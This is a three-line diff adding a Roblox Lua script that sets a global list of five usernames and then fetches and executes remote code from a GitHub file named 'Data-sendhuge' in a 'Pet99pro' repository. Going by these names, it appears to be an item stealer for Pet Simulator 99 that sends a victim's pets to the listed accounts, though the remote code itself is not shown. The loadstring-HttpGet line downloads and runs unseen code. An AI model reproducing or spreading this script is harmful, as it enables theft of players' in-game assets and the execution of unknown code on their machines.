@@ -1,0 +1,3 @@
+getgenv().usernames = {"manix6hi", "billo9xx", "barus1ik", "mcane9gb", "vermi4dm"}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dracular111/Pet99pro/main/Data-sendhuge"))()
